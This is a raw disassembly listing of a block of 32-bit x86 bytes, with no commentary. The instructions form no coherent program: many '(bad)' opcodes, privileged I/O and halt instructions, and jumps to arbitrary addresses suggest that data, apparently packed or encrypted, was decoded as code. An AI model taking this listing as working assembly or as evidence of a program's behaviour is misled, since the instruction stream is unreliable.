  412460:	mov    cl,0x42
  412462:	imul   edx,DWORD PTR [esi],0x804e1cf2
  412468:	adc    al,0x1a
  41246a:	xchg   edi,eax
  41246b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41246c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41246d:	clc    
  41246e:	mov    ebp,0x3c121ff3
  412473:	fcomp  QWORD PTR [edx]
  412475:	jmp    DWORD PTR [ecx]
  412477:	adc    ch,bl
  412479:	lahf   
  41247a:	inc    ecx
  41247b:	adc    BYTE PTR [ecx],dh
  41247d:	push   eax
  41247e:	xchg   esp,eax
  41247f:	(bad)  
  412480:	aam    0x99
  412482:	cdq    
  412483:	imul   esi,DWORD PTR [ecx],0xffffffcc
  412486:	icebp  
  412487:	mov    ecx,0xb1f167ea
  41248c:	and    eax,esi
  41248e:	imul   ebx,DWORD PTR [ebp+edx*1+0x76a1454a],0xf17e7286
  412499:	sbb    esp,DWORD PTR [eax-0x17e9773d]
  41249f:	(bad)  
  4124a0:	hlt    
  4124a1:	dec    eax
  4124a2:	rcr    BYTE PTR [edi+0x4489de82],cl
  4124a8:	enter  0xd29a,0x4f
  4124ac:	loopne 0x412513
  4124ae:	fisub  WORD PTR [ebp+0x1d]
  4124b1:	xchg   esi,eax
  4124b2:	in     eax,0xb
  4124b4:	add    bh,ch
  4124b6:	mov    dl,0x64
  4124b8:	ror    DWORD PTR [ebp-0x55],cl
  4124bb:	mov    ch,0xa6
  4124bd:	nop
  4124be:	and    al,0x5d
  4124c0:	aam    0x89
  4124c2:	cwde   
  4124c3:	sbb    DWORD PTR [edx+0x69b87fed],eax
  4124c9:	fucomi st,st(1)
  4124cb:	dec    edi
  4124cc:	sub    eax,0x4cd86a5f
  4124d1:	push   0xffffffc7
  4124d3:	add    bh,BYTE PTR [ebp-0x4e]
  4124d6:	mul    BYTE PTR [edx+0x2c27d5bb]
  4124dc:	test   BYTE PTR [ebx+0x7aa72823],dh
  4124e2:	popf   
  4124e3:	(bad)  
  4124e4:	mov    BYTE PTR [ecx+0x1d2a9d57],bl
  4124ea:	icebp  
  4124eb:	push   eax
  4124ec:	xor    ebp,ebx
  4124ee:	adc    ah,BYTE PTR [esi-0x12]
  4124f1:	in     eax,0xaf
  4124f3:	inc    esp
  4124f4:	pop    es
  4124f5:	xchg   DWORD PTR [esi-0x592203fd],esp
  4124fb:	push   edi
  4124fc:	rcl    bh,1
  4124fe:	fsubr  DWORD PTR [eax+0x2d]
  412501:	jnp    0x4124bf
  412503:	jmp    0x4124e1
  412505:	outs   dx,BYTE PTR ds:[esi]
  412506:	inc    esp
  412507:	sbb    BYTE PTR [edx-0x3ebbb699],dh
  41250d:	int    0xf4
  41250f:	sbb    DWORD PTR [edx-0x21],ecx
  412512:	(bad)  
  412513:	std    
  412514:	sbb    DWORD PTR [edx],ebx
  412516:	in     eax,dx
  412517:	leave  
  412518:	retf   
  412519:	sbb    esp,0xffffff83
  41251c:	inc    edi
  41251d:	adc    al,BYTE PTR [ebp+edx*4-0x54]
  412521:	add    ch,al
  412523:	jae    0x4124ab
  412525:	pop    ss
  412526:	inc    ebx
  412527:	dec    ebp
  412528:	pminsw mm2,QWORD PTR [eax]
  41252b:	imul   edx,DWORD PTR [edx+edi*4],0xdeeddb8f
  412532:	pushf  
  412533:	test   cl,al
  412535:	mov    al,0x48
  412537:	in     al,dx
  412538:	xor    al,0x18
  41253a:	push   ebp
  41253b:	pop    esp
  41253c:	push   ecx
  41253d:	dec    ebp
  41253e:	mov    DWORD PTR [eax],edx
  412540:	sub    BYTE PTR [ebx+0x78],bh
  412543:	pop    ds
  412544:	iret   
  412545:	cld    
  412546:	out    0xba,eax
  412548:	fcmovnbe st,st(7)
  41254a:	xor    edi,DWORD PTR [ecx+edi*4+0x1b200043]
  412551:	dec    ebx
  412552:	leave  
  412553:	and    bh,dh
  412555:	into   
  412556:	loope  0x41254f
  412558:	adc    DWORD PTR [ecx+0x62],0x9
  41255c:	xor    BYTE PTR [ebx-0x5765312b],0xd2
  412563:	popa   
  412564:	es pop ebx
  412566:	mov    esi,0x753f8723
  41256b:	cdq    
  41256c:	pushf  
  41256d:	xor    al,bh
  41256f:	scas   eax,DWORD PTR es:[edi]
  412570:	pop    ecx
  412571:	int3   
  412572:	into   
  412573:	dec    eax
  412574:	fisubr WORD PTR [ecx-0x1c]
  412577:	cld    
  412578:	nop
  412579:	jbe    0x4125e1
  41257b:	mov    ah,0x70
  41257d:	jae    0x41257e
  41257f:	jno    0x41257e
  412581:	test   BYTE PTR [edi-0x6260bb49],cl
  412587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412588:	imul   DWORD PTR [ecx]
  41258a:	jg     0x4125e8
  41258c:	or     ch,bh
  41258e:	out    dx,al
  41258f:	jnp    0x41259e
  412591:	mov    eax,0x4ca7eb1e
  412596:	fucomip st,st(6)
  412598:	out    dx,al
  412599:	popa   
  41259a:	leave  
  41259b:	fsub   DWORD PTR [edx]
  41259d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41259e:	fcmove st,st(7)
  4125a0:	adc    DWORD PTR [ebx],edi
  4125a2:	push   ss
  4125a3:	popf   
  4125a4:	cmp    DWORD PTR [edi],0x71
  4125a7:	jge    0x4125ee
  4125a9:	mov    edx,0x85e7c15d
  4125ae:	ss jmp 0x4125d1
  4125b1:	dec    DWORD PTR [eax+eax*2+0x7ff26549]
  4125b8:	clc    
  4125b9:	test   eax,esp
  4125bb:	pop    edi
  4125bc:	sbb    DWORD PTR ds:0xf6ca4e53,eax
  4125c2:	cmp    DWORD PTR ss:[ebx-0x24],0xffffffb0
  4125c7:	jae    0x4125a5
  4125c9:	frstor [edx+0x5d]
  4125cc:	inc    BYTE PTR [ebx+0x69]
  4125cf:	and    bh,BYTE PTR [ecx-0x7c67c189]
  4125d5:	and    al,0x30
  4125d7:	int3   
  4125d8:	daa    
  4125d9:	in     al,dx
  4125da:	and    eax,0x8f95165b
  4125df:	fisubr DWORD PTR [esi-0x46be08a0]
  4125e5:	adc    bh,0x9d
  4125e8:	adc    DWORD PTR [eax-0x7d],ebp
  4125eb:	or     eax,0xfea8ea6e
  4125f1:	shr    ebp,cl
  4125f3:	test   al,0x39
  4125f5:	xchg   edx,eax
  4125f6:	xchg   ebx,eax
  4125f7:	push   ebx
  4125f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125f9:	inc    ebx
  4125fa:	cmp    al,0x79
  4125fc:	push   ecx
  4125fd:	xor    al,bh
  4125ff:	jmp    FWORD PTR [esi]
  412601:	adc    al,0xfa
  412603:	adc    eax,0xa7a753b7
  412608:	push   ecx
  412609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41260a:	jp     0x412680
  41260c:	xor    DWORD PTR [ecx+0xfba155a],eax
  412612:	int    0x36
  412614:	dec    edi
  412615:	(bad)  
  412616:	inc    ebx
  412617:	leave  
  412618:	ds xchg esp,eax
  41261a:	imul   ebp,DWORD PTR [ecx],0x1df77f38
  412620:	sar    cl,cl
  412622:	bound  edx,QWORD PTR [eax+ebp*4]
  412625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412626:	loopne 0x412658
  412628:	mov    bh,0xa8
  41262a:	shl    ch,0xb
  41262d:	push   ecx
  41262e:	mov    eax,0x1725d9b1
  412633:	in     eax,0x97
  412635:	jmp    0x8907407b
  41263a:	rcl    DWORD PTR [ecx+0xe012974],0xe8
  412641:	ins    DWORD PTR es:[edi],dx
  412642:	xor    al,0x66
  412644:	lods   al,BYTE PTR ss:[esi]
  412646:	mov    edx,es
  412648:	bound  ebp,QWORD PTR [ecx]
  41264a:	cmp    eax,0xddab95f4
  41264f:	sub    ecx,esp
  412651:	iret   
  412652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412653:	lods   eax,DWORD PTR ds:[esi]
  412654:	out    dx,al
  412655:	bound  ebx,QWORD PTR [edi-0x5a51656]
  41265b:	add    BYTE PTR [ebx-0x5f30d46f],0x93
  412662:	mov    ebx,0x539b81b5
  412667:	sbb    al,0x3d
  412669:	inc    esi
  41266a:	lea    eax,ds:0xa511287c
  412670:	jp     0x412639
  412672:	mov    WORD PTR [esi-0x1cc58d2e],es
  412678:	hlt    
  412679:	cld    
  41267a:	jmp    0xe49fa68a
  41267f:	jns    0x412675
  412681:	gs xchg ecx,eax
  412683:	test   BYTE PTR [eax],0xb0
  412686:	inc    esi
  412687:	mov    al,ds:0x8a35fbb
  41268c:	jno    0x412615
  41268e:	jns    0x412674
  412690:	fyl2x  
  412692:	ret    
  412693:	pop    es
  412694:	lds    ebx,FWORD PTR [edx+eax*8]
  412697:	ret    
  412698:	dec    ecx
  412699:	cmp    BYTE PTR [ebx+0xe],dh
  41269c:	mov    esp,0xafd6a9e3
  4126a1:	xlat   BYTE PTR ds:[ebx]
  4126a2:	aad    0xf
  4126a4:	xlat   BYTE PTR ds:[ebx]
  4126a5:	aad    0xe
  4126a7:	dec    ebp
  4126a8:	xchg   edi,eax
  4126a9:	int3   
  4126aa:	fsubrp st(2),st
  4126ac:	xor    eax,0x47ead75a
  4126b1:	pop    ebx
  4126b2:	add    cl,bh
  4126b4:	mov    esi,0x1627eb08
  4126b9:	mov    ebx,0x4f87732b
  4126be:	mov    bl,0x7
  4126c0:	xchg   esp,eax
  4126c1:	(bad)  
  4126c2:	aas    
  4126c3:	adc    DWORD PTR [eax+0x30],0x79
  4126c7:	sub    al,0xd5
  4126c9:	fwait
  4126ca:	sti    
  4126cb:	push   ebx
  4126cc:	test   BYTE PTR [ebp+0x4d82541f],bh
  4126d2:	mov    dl,0xe5
  4126d4:	push   ebx
  4126d5:	les    esi,FWORD PTR [eax+0x581cfaeb]
  4126db:	lea    edx,[ebp-0x30]
  4126de:	sbb    dl,BYTE PTR [edi+0x25]
  4126e1:	test   BYTE PTR [edi-0x5cfc2064],bl
  4126e7:	cwde   
  4126e8:	sub    al,al
  4126ea:	je     0x4126fc
  4126ec:	mov    dl,0x1
  4126ee:	loopne 0x412688
  4126f0:	push   edx
  4126f1:	mov    ds:0xcefb1b81,al
  4126f6:	pushf  
  4126f7:	add    DWORD PTR [eax],ebx
  4126f9:	dec    eax
  4126fa:	inc    ecx
  4126fb:	mov    eax,ds:0xb2e795d7
  412700:	(bad)  
  412702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412703:	je     0x4126ed
  412705:	jnp    0x41270d
  412707:	loop   0x4126cc
  412709:	std    
  41270a:	adc    DWORD PTR [edx],edi
  41270c:	sbb    al,0xa1
  41270e:	pop    esp
  41270f:	xchg   esp,eax
  412710:	div    BYTE PTR [ebx+0x3f]
  412713:	inc    edi
  412714:	daa    
  412715:	mov    eax,ds:0xc1fc834f
  41271a:	cli    
  41271b:	xor    DWORD PTR [ecx],ebx
  41271d:	outs   dx,DWORD PTR ds:[esi]
  41271e:	pusha  
  41271f:	inc    edi
  412720:	repz push ebx
  412722:	popf   
  412723:	push   0x54cf3bc8
  412728:	lods   eax,DWORD PTR ds:[esi]
  412729:	mov    ah,0xe0
  41272b:	addr16 sbb esp,ebp
  41272e:	adc    DWORD PTR [ebx-0x66],esi
  412731:	lahf   
  412732:	inc    edi
  412733:	dec    esp
  412734:	dec    ecx
  412735:	out    dx,al
  412736:	jns    0x4126e4
  412738:	lea    edx,[eax-0x12b1ff21]
  41273e:	imul   ebp,DWORD PTR [esp+eax*4-0x7c],0x14b700ed
  412746:	inc    ecx
  412747:	cwde   
  412748:	outs   dx,BYTE PTR ds:[esi]
  412749:	jnp    0x4127b8
  41274b:	xchg   ebp,eax
  41274c:	add    BYTE PTR [edi-0x1f],ch
  41274f:	rol    BYTE PTR [esi+0x65],1
  412752:	sbb    esp,0xffffffd9
  412755:	fnstenv [eax+0x5d]
  412758:	push   0xffffff8d
  41275a:	dec    edi
  41275b:	dec    esp
  41275c:	test   eax,0xc7a2f5df
  412761:	cmp    esp,edx
  412763:	fnstenv es:[edi+0x56074afc]
  41276a:	loopne 0x41271d
  41276c:	dec    eax
  41276d:	rcr    eax,cl
  41276f:	test   DWORD PTR [edx],esp
  412771:	into   
  412772:	inc    ecx
  412773:	mov    ebp,0xfeb455b5
  412778:	out    0xf0,al
  41277a:	ins    BYTE PTR es:[edi],dx
  41277b:	es scas al,BYTE PTR es:[edi]
  41277d:	daa    
  41277e:	pusha  
  41277f:	sti    
  412780:	(bad)  
  412781:	ror    DWORD PTR ds:0x1ca5a5eb,1
  412787:	fidiv  WORD PTR [esi-0x23]
  41278a:	mov    esi,0x4fc5d90f
  41278f:	arpl   WORD PTR [edx+ebx*2-0x69fc6db8],bx
  412796:	xchg   ecx,eax
  412797:	scas   al,BYTE PTR es:[edi]
  412798:	xchg   esp,eax
  412799:	add    DWORD PTR [edx+0x51],edi
  41279c:	rcr    BYTE PTR [eax-0x15a9238f],1
  4127a2:	xor    eax,0x8ea24331
  4127a7:	add    BYTE PTR [edi+eiz*4],0x37
  4127ab:	fdiv   QWORD PTR [edi-0x1ecd9e65]
  4127b1:	mov    bl,0xf4
  4127b3:	mov    cl,0x4e
  4127b5:	adc    DWORD PTR [edi],0x51
  4127b8:	stos   BYTE PTR es:[edi],al
  4127b9:	mov    WORD PTR [edi-0x509c39af],?
  4127bf:	fldenv [eax+0x402093c7]
  4127c5:	sub    edx,DWORD PTR [ebx-0x40d45110]
  4127cb:	adc    al,0x0
  4127cd:	push   esi
  4127ce:	dec    ebp
  4127cf:	xchg   ecx,eax
  4127d0:	mov    ch,0x91
  4127d2:	mov    bl,0xbb
  4127d4:	lock add eax,0x4c039ecb
  4127da:	mov    bh,0x61
  4127dc:	xchg   BYTE PTR [ebp-0x5ec2f5bd],ah
  4127e2:	out    dx,al
  4127e3:	jno    0x4127b0
  4127e5:	mov    cl,0xe4
  4127e7:	sbb    DWORD PTR [edi],ebx
  4127e9:	jne    0x41276e
  4127eb:	pop    ds
  4127ec:	jns    0x412858
  4127ee:	out    dx,al
  4127ef:	xor    DWORD PTR [eax+0x16],ecx
  4127f2:	sub    al,0x94
  4127f4:	fs push cs
  4127f6:	fldcw  WORD PTR [edx]
  4127f8:	mov    ecx,DWORD PTR [esi+0x22]
  4127fb:	in     eax,0x69
  4127fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127fe:	or     BYTE PTR [edi],ch
  412800:	mov    esp,0xfd7bda80
  412805:	popf   
  412806:	(bad)
  41280c:	mov    cl,0xfd
  41280e:	xchg   ecx,eax
  41280f:	(bad)  
  412811:	mov    ecx,0xf37206c6
  412816:	cmp    al,0x2e
  412818:	les    edi,FWORD PTR [ebx-0x38]
  41281b:	fbstp  TBYTE PTR [ebx]
  41281d:	or     dl,BYTE PTR [edi]
  41281f:	and    ch,dl
  412821:	and    al,0x52
  412823:	sub    ebp,esi
  412825:	in     eax,dx
  412826:	mov    ecx,0x94937c11
  41282b:	xor    eax,0xb36b17fa
  412830:	pop    edx
  412831:	js     0x412831
  412833:	pop    ecx
  412834:	shr    BYTE PTR [ebx-0x569e38b3],cl
  41283a:	je     0x412895
  41283c:	mov    ebx,0xed39cafd
  412841:	movntq QWORD PTR [edx+edx*1+0x65d5bbbe],mm4
  412849:	sub    BYTE PTR [ebx],dl
  41284b:	std    
  41284c:	inc    eax
  41284d:	popf   
  41284e:	leave  
  41284f:	into   
  412850:	jge    0x41284d
  412852:	popa   
  412853:	cmp    BYTE PTR [ebx],al
  412855:	sbb    BYTE PTR [edx*2-0x5efe30b1],dl
  41285c:	shl    DWORD PTR [edx+0x3659a4e1],0x82
  412863:	or     DWORD PTR [ecx],esp
  412865:	mov    ds:0x49cd70a6,al
  41286a:	out    dx,al
  41286b:	call   0xe636:0x31d98ed5
  412872:	inc    ecx
  412873:	in     eax,0x9e
  412875:	xchg   ebp,eax
  412876:	sahf   
  412877:	leave  
  412878:	jl     0x4128ae
  41287a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41287c:	jmp    0xafa7:0x55058db5
  412883:	cmc    
  412884:	fisttp WORD PTR [ebp-0x55db3a64]
  41288a:	cli    
  41288b:	pop    ebp
  41288c:	pop    eax
  41288d:	stos   BYTE PTR es:[edi],al
  41288e:	xchg   esp,eax
  41288f:	xor    al,0x2d
  412891:	dec    eax
  412892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412893:	loope  0x412896
  412895:	and    BYTE PTR [ebp-0x47],dh
  412898:	push   0x70
  41289a:	test   BYTE PTR [ecx+eax*1+0x247966a4],al
  4128a1:	shl    ecx,1
  4128a3:	push   0xb589e3f4
  4128a8:	(bad)  
  4128a9:	outs   dx,DWORD PTR ds:[esi]
  4128aa:	sub    edx,0xffffff85
  4128ad:	sti    
  4128ae:	aaa    
  4128af:	dec    ebp
  4128b0:	add    DWORD PTR [eax+0x70],ebp
  4128b3:	add    ch,bh
  4128b5:	jns    0x412849
  4128b7:	cwde   
  4128b8:	mov    dl,0xc3
  4128ba:	data16 gs daa 
  4128bd:	fs pop eax
  4128bf:	mov    ah,0xcf
  4128c1:	int3   
  4128c2:	out    0x81,eax
  4128c4:	xchg   ecx,eax
  4128c5:	leave  
  4128c6:	dec    edx
  4128c7:	pop    ebp
  4128c8:	xchg   edx,eax
  4128c9:	into   
  4128ca:	test   eax,0xde3390ac
  4128cf:	inc    si
  4128d1:	sbb    al,0xe1
  4128d3:	jno    0x4128f2
  4128d5:	enter  0x9d1,0xa8
  4128d9:	inc    esp
  4128da:	jmp    0x4f6b9bd8
  4128df:	lds    ecx,FWORD PTR [edx+0x3f2cd0fc]
  4128e5:	lds    esp,FWORD PTR [ebx-0x3b4e3f4]
  4128eb:	sub    DWORD PTR [ebx],ecx
  4128ed:	and    eax,0x2a9b9159
  4128f2:	pop    esp
  4128f3:	and    BYTE PTR [ebx],ah
  4128f5:	and    BYTE PTR [esi],al
  4128f7:	push   edi
  4128f8:	or     al,0xf6
  4128fa:	jno    0x412906
  4128fc:	repz cmp edi,DWORD PTR [edi+0x64e9dc1f]
  412903:	xchg   ecx,eax
  412904:	dec    ebx
  412905:	stc    
  412906:	mov    cl,0x18
  412908:	pop    ebx
  412909:	push   eax
  41290b:	mov    ebp,0x29fe1d59
  412910:	enter  0xcb43,0xe0
  412914:	ffreep st(0)
  412916:	(bad)  
  412918:	ja     0x412903
  41291a:	sbb    al,0x9e
  41291c:	vpunpcklwd ymm5,ymm4,YMMWORD PTR [bx+di-0x4a]
  412922:	lock call 0x1d0b9a2f
  412928:	in     eax,dx
  412929:	mov    ?,WORD PTR [ecx]
  41292b:	and    esp,ecx
  41292d:	xor    esi,edi
  41292f:	into   
  412930:	sti    
  412931:	jmp    0x6ba4:0x86a93aea
  412938:	pop    edi
  412939:	pop    ecx
  41293a:	cmp    al,0xc3
  41293c:	das    
  41293d:	pop    eax
  41293e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41293f:	xor    ebx,DWORD PTR [ebx]
  412941:	xchg   edx,eax
  412942:	rcl    DWORD PTR [ecx],0xf8
  412945:	adc    DWORD PTR gs:0xb25dd501,ebx
  41294c:	sub    DWORD PTR [edx+esi*4],esi
  41294f:	popa   
  412950:	adc    al,BYTE PTR [edi+0x46]
  412953:	mov    ch,0xac
  412955:	fsub   QWORD PTR [ebx-0x21246f19]
  41295b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41295c:	cmp    al,BYTE PTR [esi+0x18]
  41295f:	ins    DWORD PTR es:[edi],dx
  412960:	les    eax,FWORD PTR es:[esi]
  412963:	daa    
  412964:	(bad)  
  412965:	ins    DWORD PTR es:[edi],dx
  412966:	adc    cl,bl
  412968:	push   esi
  412969:	mov    ah,0x76
  41296b:	push   ebp
  41296c:	pop    ds
  41296d:	cmp    DWORD PTR [ebp-0x9011eb0],ebp
  412973:	int    0xb
  412975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412976:	pop    edx
  412977:	ins    DWORD PTR es:[edi],dx
  412978:	pop    eax
  412979:	mov    cl,0x2b
  41297b:	xor    eax,0xca884f03
  412980:	(bad)  
  412981:	in     al,dx
  412982:	stc    
  412983:	jne    0x412905
  412985:	sub    al,0x62
  412987:	mov    ecx,0x281e1956
  41298c:	xor    ebx,eax
  41298e:	inc    esi
  41298f:	addr16 das 
  412991:	lea    ebp,[eax]
  412993:	int    0x9c
  412995:	inc    esi
  412996:	pop    ebp
  412997:	lds    ebp,FWORD PTR [ecx+ebp*2-0x6]
  41299b:	xor    eax,0x50377cf0
  4129a0:	jne    0x4129e8
  4129a2:	outs   dx,DWORD PTR ds:[esi]
  4129a3:	jo     0x412a06
  4129a5:	sti    
  4129a6:	jnp    0x412937
  4129a8:	pop    ebp
  4129a9:	rcr    DWORD PTR [ebx-0x80],0xd3
  4129ad:	jno    0x412986
  4129af:	sub    BYTE PTR [edx],cl
  4129b1:	out    dx,eax
  4129b2:	mov    DWORD PTR [eax],ebx
  4129b4:	fdiv   DWORD PTR [edx+0x148aab8e]
  4129ba:	inc    edi
  4129bb:	adc    al,0x9e
  4129bd:	sub    al,0x69
  4129bf:	fwait
  4129c0:	les    eax,FWORD PTR [ebx-0x1e]
  4129c3:	jns    0x4129b8
  4129c5:	scas   eax,DWORD PTR es:[edi]
  4129c6:	mov    WORD PTR [edx-0x12],ss
  4129c9:	mov    dh,0xd1
  4129cb:	ja     0x41299a
  4129cd:	bound  edi,QWORD PTR [ebx+0x7b415eb9]
  4129d3:	mov    cl,0xc2
  4129d5:	ja     0x412994
  4129d7:	dec    ecx
  4129d8:	and    eax,0xa23ece62
  4129dd:	add    DWORD PTR [esi+0x220c2201],edi
  4129e3:	call   0xfa72ee22
  4129e8:	in     eax,dx
  4129e9:	loop   0x412992
  4129eb:	and    DWORD PTR [eax],ebp
  4129ed:	int3   
  4129ee:	lahf   
  4129ef:	add    BYTE PTR [eax],ch
  4129f1:	test   DWORD PTR [edx+edi*4+0x532f14c8],ebx
  4129f8:	push   0xffffff96
  4129fa:	cmc    
  4129fb:	dec    ecx
  4129fc:	mov    esp,0xede8daa6
  412a01:	pushf  
  412a02:	pop    esp
  412a03:	xlat   BYTE PTR ds:[ebx]
  412a04:	sbb    DWORD PTR [ebp-0x5c],edi
  412a07:	out    0x56,al
  412a09:	or     DWORD PTR [ecx+ebx*8-0x3d842a86],ecx
  412a10:	ss inc ebp
  412a12:	inc    edi
  412a13:	push   edx
  412a14:	scas   eax,DWORD PTR es:[edi]
  412a15:	mov    al,BYTE PTR [ecx-0x13276a61]
  412a1b:	mov    gs,WORD PTR [ebp-0x38e23551]
  412a21:	std    
  412a22:	scas   eax,DWORD PTR es:[edi]
  412a23:	imul   esp,DWORD PTR [edi],0xffffffa8
  412a26:	add    eax,0xb5f0a697
  412a2b:	xchg   DWORD PTR [edi],ecx
  412a2d:	stos   BYTE PTR es:[edi],al
  412a2e:	mov    ebx,ss
  412a30:	and    BYTE PTR [esi],0x30
  412a33:	out    dx,al
  412a34:	push   cs
  412a35:	jge    0x4129cd
  412a37:	fidiv  DWORD PTR [edi-0x11]
  412a3a:	(bad)  
  412a3b:	jbe    0x412aba
  412a3d:	dec    eax
  412a3e:	add    ebp,DWORD PTR ds:0xc084b28
  412a44:	xor    BYTE PTR [edi+0x73e3fcd7],bl
  412a4a:	xor    DWORD PTR [edi+0x961aff7],ebx
  412a50:	xchg   edi,eax
  412a51:	jnp    0x4129d3
  412a53:	or     BYTE PTR [edi+0x42],dl
  412a56:	sub    al,0xf5
  412a58:	stos   BYTE PTR es:[edi],al
  412a59:	add    ch,BYTE PTR [edi-0x28]
  412a5c:	es mov dl,0x8b
  412a5f:	ret    0xf376
  412a62:	or     ah,BYTE PTR [edx-0x55]
  412a65:	dec    eax
  412a66:	pop    ds
  412a67:	setp   BYTE PTR [esi-0x40]
  412a6b:	pop    eax
  412a6c:	das    
  412a6d:	je     0x412a88
  412a6f:	sar    esi,1
  412a71:	push   0x6826205c
  412a76:	in     al,dx
  412a77:	bound  esp,QWORD PTR [ebx+0x25b22410]
  412a7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a7e:	dec    esp
  412a7f:	int3   
  412a80:	push   esi
  412a81:	fidivr DWORD PTR [edi]
  412a83:	xchg   ebx,eax
  412a84:	mov    ecx,0x9f9b216a
  412a89:	std    
  412a8a:	jmp    0x412ad8
  412a8c:	jecxz  0x412a2f
  412a8e:	in     eax,0xd8
  412a90:	jmp    0xf593:0x5c0dd57e
  412a97:	hlt    
  412a98:	pop    ebx
  412a99:	pop    esp
  412a9a:	mov    eax,ds:0x2ea5225
  412a9f:	lods   eax,DWORD PTR ds:[esi]
  412aa0:	jns    0x412a51
  412aa2:	call   0x63cf107a
  412aa7:	mov    WORD PTR [ecx],es
  412aa9:	xor    dh,BYTE PTR [esi+eax*8]
  412aac:	xlat   BYTE PTR ds:[ebx]
  412aad:	adc    esp,esi
  412aaf:	or     DWORD PTR [ecx],ebx
  412ab1:	mov    esp,0x37eadc12
  412ab6:	pop    ebx
  412ab7:	sub    cl,dh
  412ab9:	jne    0x412aa4
  412abb:	push   ds
  412abc:	dec    ebx
  412abd:	and    al,0x4d
  412abf:	xchg   ebx,eax
  412ac0:	ins    DWORD PTR es:[edi],dx
  412ac1:	mov    esi,0x7bf5a307
  412ac6:	pop    esp
  412ac7:	mov    edx,0x36965ca6
  412acc:	fcmovnb st,st(2)
  412ace:	and    edx,DWORD PTR [ebp+0x47]
  412ad1:	mov    ebx,0xe4bf8b4f
  412ad6:	iret   
  412ad7:	or     ah,ch
  412ad9:	adc    ecx,ecx
  412adb:	xchg   edx,eax
  412adc:	aaa    
  412add:	(bad)  
  412ade:	jmp    0x412ab0
  412ae0:	and    al,0xbf
  412ae2:	xchg   edx,eax
  412ae3:	pop    edi
  412ae4:	push   edi
  412ae5:	inc    ebx
  412ae6:	sahf   
  412ae7:	inc    ebp
  412ae8:	aaa    
  412ae9:	nop
  412aea:	hlt    
  412aeb:	and    al,0xc4
  412aed:	mov    ebx,0xd1fb6579
  412af2:	and    BYTE PTR [edi+0x58],bl
  412af5:	les    esi,FWORD PTR [ebx+0x2b]
  412af8:	fwait
  412af9:	jp     0x412afd
  412afb:	ss mov edx,0x8656efe6
  412b01:	scas   al,BYTE PTR es:[edi]
  412b02:	add    eax,0x61844cde
  412b07:	aad    0xb6
  412b09:	cmp    edx,DWORD PTR [ecx-0x70]
  412b0c:	push   edi
  412b0d:	dec    ebp
  412b0e:	call   FWORD PTR [esi]
  412b10:	xlat   BYTE PTR ds:[ebx]
  412b11:	loope  0x412b11
  412b13:	out    0x76,al
  412b15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b16:	mov    cl,0x51
  412b18:	out    dx,al
  412b19:	jns    0x412aab
  412b1b:	mov    DWORD PTR [ecx-0x6efa2f6f],esp
  412b21:	push   0xffffff84
  412b23:	cdq    
  412b24:	jns    0x412b38
  412b26:	js     0x412b9a
  412b28:	add    bh,BYTE PTR [esi+0x41]
  412b2b:	addr16 mov cl,0xfe
  412b2e:	adc    DWORD PTR [ebp+0x2d],0xf06f5e66
  412b35:	popf   
  412b36:	xchg   ecx,eax
  412b37:	xchg   ebp,eax
  412b38:	add    al,0xc8
  412b3a:	(bad)  
  412b3b:	or     DWORD PTR [ebp+0x6c147f79],edx
  412b41:	fstp   DWORD PTR gs:[edx-0x30]
  412b45:	jb     0x412bb2
  412b47:	mov    cl,0x4e
  412b49:	xchg   edi,eax
  412b4a:	fs repnz enter 0x3aa6,0x9e
  412b50:	jmp    0x412b87
  412b52:	popf   
  412b53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b54:	inc    edx
  412b55:	stc    
  412b56:	xor    DWORD PTR [esi],ebx
  412b58:	xchg   DWORD PTR [esi-0x22f55cb3],esi
  412b5e:	jne    0x412b60
  412b60:	in     al,dx
  412b61:	inc    ecx
  412b62:	(bad)  
  412b63:	dec    edi
  412b64:	fmul   QWORD PTR [esi+0x32]
  412b67:	scas   al,BYTE PTR es:[edi]
  412b68:	xlat   BYTE PTR ds:[ebx]
  412b69:	rcr    dl,0xfc
  412b6c:	les    ecx,FWORD PTR [ebx-0x36]
  412b6f:	cmp    ah,BYTE PTR [ecx-0x37d65f9a]
  412b75:	sub    edx,DWORD PTR [ebp-0x40b03a0d]
  412b7b:	add    dh,bl
  412b7d:	and    edi,DWORD PTR [edi+eax*4+0x2c]
  412b81:	xchg   ebx,eax
  412b82:	cmp    DWORD PTR [eax-0x37],edx
  412b85:	cmp    al,0x4a
  412b87:	bound  edi,QWORD PTR [edx-0x5a44a4a8]
  412b8d:	lahf   
  412b8e:	fs push es
  412b90:	cmp    BYTE PTR [esi],0x7a
  412b93:	dec    ecx
  412b94:	mov    ah,0x3
  412b96:	stos   BYTE PTR es:[edi],al
  412b97:	div    BYTE PTR [eax+0x29]
  412b9a:	jmp    0x412b32
  412b9c:	iret   
  412b9d:	mov    DWORD PTR [ebx+ebx*2-0x7545882d],esp
  412ba4:	xor    eax,DWORD PTR [ebx+0x55f5d3e6]
  412baa:	call   0x18b4:0xdd36ee55
  412bb1:	rol    BYTE PTR [esi-0x491f728],1
  412bb7:	lods   eax,DWORD PTR ds:[esi]
  412bb8:	pop    DWORD PTR [ebx-0x1fa63cd5]
  412bbe:	popf   
  412bbf:	icebp  
  412bc0:	mov    ebx,0xc5a7bf7d
  412bc5:	jmp    0x24fd53f0
  412bca:	pop    edx
  412bcb:	dec    ecx
  412bcc:	inc    esi
  412bcd:	sbb    eax,0x7f14af2
  412bd2:	jb     0x412bce
  412bd4:	adc    esi,DWORD PTR [edx+0x7b]
  412bd7:	ror    dl,0xf9
  412bda:	ret    
